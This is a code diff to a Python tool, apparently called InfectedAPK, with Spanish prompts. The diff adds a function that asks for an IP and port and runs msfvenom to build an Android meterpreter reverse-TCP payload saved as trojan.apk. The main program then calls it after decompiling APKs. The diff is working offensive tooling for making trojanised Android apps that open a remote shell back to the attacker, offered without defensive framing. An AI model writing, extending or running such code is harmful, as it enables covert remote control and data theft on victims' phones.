@@ -166,6 +166,27 @@ def decompileApk(apk_file):
         print(f"\nError: El archivo {apk_file} no existe o no tiene permisos de lectura.")
         sys.exit(1)
 
+def msfvenomGenerateApk(trojanApkRoute):
+    if not os.path.exists(trojanApkRoute):
+        print("Generando troyano...\n")
+
+        os.chdir("/home/Documents/InfectedAPK/APKs")
+        localIP = input("Introduce tu IP local:")
+        localPort = input("Introduce un puerto:")
+        print("\n")
+
+        comando = (
+            f"msfvenom -p android/meterpreter/reverse_tcp "
+            f"lhost={localIP} lport={localPort} R > trojan.apk"
+        )
+
+        msfvenomGenerateApkResult = subprocess.run(comando, shell=True)
+        if msfvenomGenerateApkResult.returncode == 0:
+            print("Payload generado con éxito.")
+        else:
+            print("Error al generar el payload.")
+
+
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
     return result_verificar_programas_windowsx.returncode == 0
@@ -231,6 +252,9 @@ def main():
 
             ruta_apks = "/home/Documents/InfectedAPK/APKs"
             menu_linux_descomprimir_apk(ruta_apks)
+
+            trojanApkRoute = "/home/Documents/InfectedAPK/APKs/trojan.apk"
+            msfvenomGenerateApk(trojanApkRoute)
 
         elif sistema == "nt":
             repoUrl = "https://github.com/APKentiTEAM/InfectedAPK.git"
